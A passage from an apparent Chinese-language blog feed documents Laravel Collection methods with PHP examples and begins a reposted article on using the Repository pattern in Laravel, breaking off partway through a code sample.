class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$chunk = $collection-&gt;take(<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">$chunk-&gt;all();<span class="comment">// [4, 5]</span></span><br></pre></td></tr></table></figure><h3 id="tap"><a href="#tap" class="headerlink" title="tap"></a>tap</h3><p>传递集合到给定回调，从而允许你在指定入口进入集合并对集合项进行处理而不影响集合本身。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>])</span><br><span class="line">    -&gt;sort()</span><br><span class="line">    -&gt;tap(<span class="function"><span class="keyword">function</span> <span class="params">($collection)</span> </span>&#123;</span><br><span class="line">        Log::debug(<span class="string">'Values after sorting'</span>, $collection-&gt;values()-&gt;toArray());</span><br><span class="line">    &#125;)</span><br><span class="line">    -&gt;shift();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h3 id="times"><a href="#times" class="headerlink" title="times"></a>times</h3><p>静态<code>times()</code> 方法通过调用给定次数的回调函数来创建新集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = Collection::times(<span class="number">10</span>, <span class="function"><span class="keyword">function</span> <span class="params">($number)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $number * <span class="number">9</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$collection-&gt;all();     <span class="comment">// [9, 18, 27, 36, 45, 54, 63, 72, 81, 90]</span></span><br></pre></td></tr></table></figure><p>该方法在和工厂方法一起创建 Eloquent 模型时很有用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$categories = Collection::times(<span class="number">3</span>, <span class="function"><span class="keyword">function</span> <span class="params">($number)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> factory(Category::class)-&gt;create([<span class="string">'name'</span> =&gt; <span class="string">'Category #'</span>.$number]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$categories-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['id' =&gt; 1, 'name' =&gt; 'Category #1'],</span></span><br><span class="line"><span class="comment">        ['id' =&gt; 2, 'name' =&gt; 'Category #2'],</span></span><br><span class="line"><span class="comment">        ['id' =&gt; 3, 'name' =&gt; 'Category #3'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h3><p>迭代集合并对集合内的每个项目调用给定的回调。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$multiplied = $collection-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $item * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$multiplied-&gt;all();     <span class="comment">// [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure><p>注意：each 只是遍历集合，map 则会返回一个新的集合实例；它不会修改原集合。如果你想修改原集合，请使用 transform 方法。</p><h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3><p>将给定的数组添加到集合中。如果给定的数组含有与原集合一样的键，则首选原始集合的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span> =&gt; [<span class="string">'a'</span>], <span class="number">2</span> =&gt; [<span class="string">'b'</span>]]);</span><br><span class="line"></span><br><span class="line">$union = $collection-&gt;union([<span class="number">3</span> =&gt; [<span class="string">'c'</span>], <span class="number">1</span> =&gt; [<span class="string">'b'</span>]]);</span><br><span class="line">$union-&gt;all();      <span class="comment">// [1 =&gt; ['a'], 2 =&gt; ['b'], 3 =&gt; ['c']]</span></span><br></pre></td></tr></table></figure><h3 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h3><p>返回集合中所有的唯一数据项， 返回的集合保持原来的数组键，在本例中我们使用 values 方法重置这些键为连续的数字索引</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">$unique = $collection-&gt;unique();</span><br><span class="line"><span class="comment">// 使用value 重置索引</span></span><br><span class="line">$unique-&gt;values()-&gt;all();     <span class="comment">// [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure><p>当处理嵌套数组或对象时，你可以指定用于确定唯一性的键：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'iPhone 6'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Apple'</span>, <span class="string">'type'</span> =&gt; <span class="string">'phone'</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'iPhone 5'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Apple'</span>, <span class="string">'type'</span> =&gt; <span class="string">'phone'</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Apple Watch'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Apple'</span>, <span class="string">'type'</span> =&gt; <span class="string">'watch'</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Galaxy S6'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Samsung'</span>, <span class="string">'type'</span> =&gt; <span class="string">'phone'</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Galaxy Gear'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Samsung'</span>, <span class="string">'type'</span> =&gt; <span class="string">'watch'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$unique = $collection-&gt;unique(<span class="string">'brand'</span>);</span><br><span class="line">$unique-&gt;values()-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'iPhone 6', 'brand' =&gt; 'Apple', 'type' =&gt; 'phone'],</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'Galaxy S6', 'brand' =&gt; 'Samsung', 'type' =&gt; 'phone'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>你还可以指定自己的回调用于判断数据项唯一性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$unique = $collection-&gt;unique(<span class="function"><span class="keyword">function</span> <span class="params">($item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $item[<span class="string">'brand'</span>].$item[<span class="string">'type'</span>];</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$unique-&gt;values()-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'iPhone 6', 'brand' =&gt; 'Apple', 'type' =&gt; 'phone'],</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'Apple Watch', 'brand' =&gt; 'Apple', 'type' =&gt; 'watch'],</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'Galaxy S6', 'brand' =&gt; 'Samsung', 'type' =&gt; 'phone'],</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'Galaxy Gear', 'brand' =&gt; 'Samsung', 'type' =&gt; 'watch'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="uniqueStrict"><a href="#uniqueStrict" class="headerlink" title="uniqueStrict"></a>uniqueStrict</h3><p>该方法和 <code>unique</code> 方法签名一样，不同之处在于所有值都是「严格」比较。</p><h3 id="unless"><a href="#unless" class="headerlink" title="unless"></a>unless</h3><p>会执行给定回调，除非传递到该方法的第一个参数等于 true。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;unless(<span class="keyword">true</span>, <span class="function"><span class="keyword">function</span> <span class="params">($collection)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $collection-&gt;push(<span class="number">4</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$collection-&gt;unless(<span class="keyword">false</span>, <span class="function"><span class="keyword">function</span> <span class="params">($collection)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $collection-&gt;push(<span class="number">5</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$collection-&gt;all();</span><br><span class="line"><span class="comment">// [1, 2, 3, 5]</span></span><br></pre></td></tr></table></figure><p>与 unless 相对的方法是 when。</p><h3 id="values"><a href="#values" class="headerlink" title="values"></a>values</h3><p>返回键被重置为连续编号的新集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    <span class="number">10</span> =&gt; [<span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">200</span>],</span><br><span class="line">    <span class="number">11</span> =&gt; [<span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">200</span>]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$values = $collection-&gt;values();</span><br><span class="line"></span><br><span class="line">$values-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        0 =&gt; ['product' =&gt; 'Desk', 'price' =&gt; 200],</span></span><br><span class="line"><span class="comment">        1 =&gt; ['product' =&gt; 'Desk', 'price' =&gt; 200],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="unwrap"><a href="#unwrap" class="headerlink" title="unwrap"></a>unwrap</h3><p>静态 unwrap 方法会从给定值中返回集合项。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Collection::unwrap(collect(<span class="string">'John Doe'</span>));</span><br><span class="line"><span class="comment">// ['John Doe']</span></span><br><span class="line"></span><br><span class="line">Collection::unwrap([<span class="string">'John Doe'</span>]);</span><br><span class="line"><span class="comment">// ['John Doe']</span></span><br><span class="line"></span><br><span class="line">Collection::unwrap(<span class="string">'John Doe'</span>);</span><br><span class="line"><span class="comment">// 'John Doe'</span></span><br></pre></td></tr></table></figure><h3 id="when"><a href="#when" class="headerlink" title="when"></a>when</h3><p>当传入的第一个参数为 true 的时，将执行给定的回调。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;when(<span class="keyword">true</span>, <span class="function"><span class="keyword">function</span> <span class="params">($collection)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $collection-&gt;push(<span class="number">4</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$collection-&gt;all();     <span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当传入的第一个参数不为 true 的时候，将执行给定的回调函数</span></span><br><span class="line">$collection-&gt;unless(<span class="keyword">false</span>, <span class="function"><span class="keyword">function</span> <span class="params">($collection)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $collection-&gt;push(<span class="number">5</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="where"><a href="#where" class="headerlink" title="where"></a>where</h3><p>通过给定的键值过滤集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">200</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Chair'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Bookcase'</span>, <span class="string">'price'</span> =&gt; <span class="number">150</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Door'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$filtered = $collection-&gt;where(<span class="string">'price'</span>, <span class="number">100</span>);</span><br><span class="line">$filtered-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Chair', 'price' =&gt; 100],</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Door', 'price' =&gt; 100],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="whereStrict"><a href="#whereStrict" class="headerlink" title="whereStrict"></a>whereStrict</h3><p><code>whereStrict</code>方法使用严格模式通过给定的键值过滤集合。</p><h3 id="whenEmpty"><a href="#whenEmpty" class="headerlink" title="whenEmpty"></a>whenEmpty</h3><p>当集合为空时，将执行给定的回调函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'michael'</span>, <span class="string">'tom'</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;whenEmpty(<span class="function"><span class="keyword">function</span> <span class="params">($collection)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $collection-&gt;push(<span class="string">'adam'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$collection-&gt;all();     <span class="comment">// ['michael', 'tom']</span></span><br></pre></td></tr></table></figure><p>反之<code>whenNotEmpty()</code> 方法当集合不为空时，将执行给定的回调函数。</p><h3 id="whereIn"><a href="#whereIn" class="headerlink" title="whereIn"></a>whereIn</h3><p>通过给定的键值数组来过滤集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">200</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Chair'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Bookcase'</span>, <span class="string">'price'</span> =&gt; <span class="number">150</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Door'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$filtered = $collection-&gt;whereIn(<span class="string">'price'</span>, [<span class="number">150</span>, <span class="number">200</span>]);</span><br><span class="line">$filtered-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Desk', 'price' =&gt; 200],</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Bookcase', 'price' =&gt; 150],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>类似方法还有<code>whereNotIn</code>、<code>whereBetween</code>、<code>whereNotInStrict</code>。</p><h3 id="whereBetween"><a href="#whereBetween" class="headerlink" title="whereBetween"></a>whereBetween</h3><p>筛选指定范围内的集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">200</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Chair'</span>, <span class="string">'price'</span> =&gt; <span class="number">80</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Bookcase'</span>, <span class="string">'price'</span> =&gt; <span class="number">150</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Pencil'</span>, <span class="string">'price'</span> =&gt; <span class="number">30</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Door'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$filtered = $collection-&gt;whereBetween(<span class="string">'price'</span>, [<span class="number">100</span>, <span class="number">200</span>]);</span><br><span class="line">$filtered-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Desk', 'price' =&gt; 200],</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Bookcase', 'price' =&gt; 150],</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Door', 'price' =&gt; 100],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="wrap"><a href="#wrap" class="headerlink" title="wrap"></a>wrap</h3><p>静态 wrap 方法会将给定值封装到集合中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$collection = Collection::wrap(<span class="string">'John Doe'</span>);</span><br><span class="line"></span><br><span class="line">$collection-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ['John Doe']</span></span><br><span class="line"></span><br><span class="line">$collection = Collection::wrap([<span class="string">'John Doe'</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ['John Doe']</span></span><br><span class="line"></span><br><span class="line">$collection = Collection::wrap(collect(<span class="string">'John Doe'</span>));</span><br><span class="line"></span><br><span class="line">$collection-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ['John Doe']</span></span><br></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>将给定数组的值与相应索引处的原集合的值合并在一起。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'Chair'</span>, <span class="string">'Desk'</span>]);</span><br><span class="line"></span><br><span class="line">$zipped = $collection-&gt;zip([<span class="number">100</span>, <span class="number">200</span>]);</span><br><span class="line">$zipped-&gt;all();     <span class="comment">// [['Chair', 100], ['Desk', 200]]</span></span><br></pre></td></tr></table></figure><h2 id="高阶消息传递"><a href="#高阶消息传递" class="headerlink" title="高阶消息传递"></a>高阶消息传递</h2><p>集合还支持“高阶消息传递”，也就是在集合上执行通用的功能，支持高阶消息传递的方法包括：<code>average</code>、<code>avg</code>、<code>contains</code>、<code>each</code>、<code>every</code>、<code>filter</code>、<code>first</code>、<code>map</code>、<code>partition</code>、<code>reject</code>、<code>sortBy</code>、<code>sortByDesc</code>、<code>sum</code> 和 <code>unique</code>。</p><p>每个高阶消息传递都可以在集合实例上以动态属性的方式访问，例如，我们使用 each 高阶消息传递来在集合的每个对象上调用一个方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$users = User::where(<span class="string">'votes'</span>, <span class="string">'&gt;'</span>, <span class="number">500</span>)-&gt;get();</span><br><span class="line"></span><br><span class="line">$users-&gt;each-&gt;markAsVip();</span><br></pre></td></tr></table></figure><p>类似的，我们可以使用 sum 高阶消息传递来聚合用户集合的投票总数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$users = User::where(<span class="string">'group'</span>, <span class="string">'Development'</span>)-&gt;get();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $users-&gt;sum-&gt;votes;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://curder.gitbooks.io/laravel_study/content/collections/" target="_blank" rel="noopener">Laravel 的集合 Collection</a></li><li><a href="https://learnku.com/docs/laravel/8.x/collections/9390" target="_blank" rel="noopener">Laravel 集合——Laravel8.x 中文文档</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『转载』如何使用Repository 模式</title>
      <link href="/how-to-use-repository-mode/"/>
      <url>/how-to-use-repository-mode/</url>
      
        <content type="html"><![CDATA[<p>若将数据库逻辑都写在 Model 里，会造成 model 代码的臃肿难以维护，基于 <strong>SOLID</strong> 原则，我们应该使用 <strong>Repository</strong> 模式辅助 Model，将相关的数据库逻辑封装在不同的 Repository，方便后期项目的维护。</p><a id="more"></a><h2 id="数据库逻辑"><a href="#数据库逻辑" class="headerlink" title="数据库逻辑"></a>数据库逻辑</h2><p>在 CURD 中，CUR 比较稳定，但 Read 的部分则变化万千，大部分的数据库逻辑都在描述 Read 部分，若将数据库逻辑写在 Controller 或 Model 都不合适，会造成 Controller 或 Model 代码臃肿，如后难以维护。</p><h2 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h2><p>使用 Repository 模式之后，Model 仅仅当成 Eloquent Class 即可，不需要包含数据库逻辑，仅保留如下部分：</p><ul><li>Property： 如 <code>$table</code>、<code>$fillable</code> …</li><li>Mutator： 包括 mutator 与 accessor</li><li>Method： relation 类的方法，比如使用 <code>hasMany()</code> 与 <code>belongsTo()</code></li></ul><p>单一对应关系：</p><ul><li>hasOne</li><li>belongsTo</li><li>morphTo</li><li>morphOne</li></ul><p>多个对应关系指的是使用以下关键词定义的关联模型：</p><ul><li>hasMany</li><li>belongsToMany</li><li>morphMany</li><li>morphToMany</li><li>morphedByMany</li></ul><h2 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h2><p>在开发时常常会在 Controller 直接调用 Model 写数据库逻辑，如下：获取数据库中用户 <code>age&gt;20</code> 的数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> User::where(<span class="string">'age'</span>,<span class="string">'&gt;'</span>,<span class="number">20</span>)-&gt;orderBy(<span class="string">'age'</span>)-&gt;get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写逻辑会有几个问题：</p><ul><li>将数据库逻辑写在 Controller，造成 Controller 代码臃肿难以维护。</li><li>违反了 SOLID 的单一职责原则，数据库逻辑不应该写在 Controller 中。</li><li>Controller 直接操作 Model，使得对 Controller 做单元测试困难。</li></ul><p>比较好的方式是使用 Repository：</p><ul><li>将 Model 依赖注入到 Repository。</li><li>将数据库逻辑写在 Repository。</li><li>将 Repository 依赖注入到 Service。</li></ul><p><code>app/Repositories/UserRepostitory.php</code> 中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Repositories</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class UserRepository</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Repositories</span></span><br><span class="line"><span class="comment"> 